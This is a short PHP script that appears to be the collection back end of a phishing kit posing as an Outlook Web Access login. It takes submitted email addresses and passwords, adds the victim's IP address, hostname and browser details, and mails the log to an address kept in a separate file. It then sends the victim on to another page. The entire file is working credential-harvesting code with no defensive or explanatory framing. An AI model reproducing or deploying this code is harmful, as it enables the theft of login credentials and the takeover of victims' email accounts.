<?php
if($_POST["email"] != "" and $_POST["pd"] != ""){
$ip = getenv("REMOTE_ADDR");
$login = $_POST['email'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST[ 'pd']."\n";
$message .= "============= [ F B G ] =============\n";
$message .= 	"IP:  ".$ip."\n";
$message .= 	"User-Agent: ".$useragent."\n";
include 'email.php';
$subject = "OWA Log | $login | $ip ";
{
mail("$to", "$subject", "$send", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf2.php?user2=".$_POST['email']);
}else{
header ("Location: index.php");
}

?>